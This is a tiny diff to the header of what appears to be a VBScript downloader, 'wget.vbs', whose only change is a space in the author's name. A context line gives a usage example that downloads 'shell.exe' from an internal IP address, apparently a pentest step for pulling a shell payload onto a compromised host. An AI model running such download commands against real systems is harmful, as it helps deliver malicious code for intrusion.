@@ -1,4 +1,4 @@
-##Author : Andrey Querino
+##Author : AndreyQuerino
 ##Descr  : Wget.vbs
 
 ##Download cmd: $cscript wget.vbs http://192.168.100.5/shell.exe shell.exe
